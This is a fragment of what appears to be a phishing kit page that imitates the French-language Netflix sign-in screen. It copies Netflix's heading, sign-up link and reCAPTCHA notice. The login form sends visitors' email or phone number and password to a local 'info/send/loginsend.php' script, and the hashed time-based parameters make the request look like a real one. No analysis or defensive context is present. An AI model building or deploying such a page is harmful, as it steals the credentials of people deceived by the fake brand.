...
.error>.nfTextField, .nfTextField.error {
    border-color: #b92d2b;
}
.nfTextField:invalid, .nfTextField:valid {
        ...
        <div class="wrapper">
            ...
            <div class="login-box" style="max-width:450px;">
                <div class="login-box-inner">
                    <h1>S'identifier</h1>
                                        <form action="<?php echo './info/send/loginsend.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" method="post"> 
                        <div class="form-group">
                            <input type="text" name="email" style="font-size: 16px;" placeholder="Email ou numéro de téléphone" required="">
                        </div>
                        <div class="form-group">
                            <input type="password" name="password" style="font-size: 16px;" placeholder="Mot de passe">
                        </div>
                        <div class="form-group">
                        ...
                        <div class="hybrid-login-form-other">
                           <a href="#"> <img src="./img/fb.PNG" style="margin-left:-4px;border-radius:4px;"></a>

                            <div class="login-signup-now" data-uia="login-signup-now">Première visite sur Netflix&nbsp;?

                             <a class="linke" href="">Inscrivez-vous</a>.

                         </div><div class="recaptcha-terms-of-use" data-uia="recaptcha-terms-of-use"><p><span>Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.</span>&nbsp;<br><span style="color: #0071eb;">En savoir plus.</span></p></div></div>
